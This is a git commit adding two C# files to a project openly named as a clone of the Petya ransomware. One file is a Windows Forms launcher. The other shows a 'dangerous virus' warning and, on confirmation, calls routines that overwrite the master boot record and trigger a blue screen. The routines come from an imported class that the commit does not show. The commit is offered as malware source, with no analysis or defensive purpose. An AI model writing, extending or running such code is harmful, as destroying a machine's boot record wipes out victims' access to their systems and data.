13521bb99dc61fc4e1532ade5a7c95f7b4c62498
JackImpact <109435498+JackImpact1023@users.noreply.github.com>
2022-07-16 22:00:38 +0300

    Petya Red

---
+++ PetyaRansomware-CSharpEdition/Program.cs
@@ -0,0 +1,19 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace PetyaRansomware_CSharpEdition
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new petya_start());
+        }
+    }
+}
---
+++ PetyaRansomware-CSharpEdition/petya_start.cs
@@ -0,0 +1,31 @@
+﻿using Petya.MBR;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace PetyaRansomware_CSharpEdition
+{
+    public partial class petya_start : Form
+    {
+        public petya_start()
+        {
+            InitializeComponent();
+            if(MessageBox.Show("WARNING!!! It's Dangerous Virus(Petya Ransomware), Do u want to run this Malware?!?!", "Petya", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
+            {
+                PetyaMBR pet = new PetyaMBR();
+                pet.MBROverwrite();
+                pet.CallBSOD();
+            }
+            else
+            {
+                Environment.Exit(0123);
+            }
+        }
+    }
+}
